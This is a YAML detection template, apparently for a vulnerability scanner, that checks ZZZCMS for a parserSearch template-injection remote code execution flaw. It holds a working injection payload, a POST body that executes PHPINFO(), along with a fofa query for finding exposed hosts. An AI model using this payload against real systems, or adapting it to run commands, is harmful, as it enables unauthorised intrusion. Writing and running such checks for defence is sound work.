id: zzzcms-parser-search-rce

info:
  name: ZZZCMS parserSearch 远程命令执行漏洞
  author: daffainfo
  severity: critical
  verified: false
  description: |
    ZZZCMS parserSearch 存在模板注入导致远程命令执行漏洞 
    fofa: app="zzzcms"
  tags: zzzcms,parserSearch,rce
  created: 2025/03/21

rules:
  r0:
    request:
      method: POST
      path: /?location=search
      headers:
        Pragma: no-cache
        Cache-Control: no-cache
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
        Content-Type: text/plain
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
      body: |
        keys={if:=PHPINFO()}{end if}
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
expression: r0()
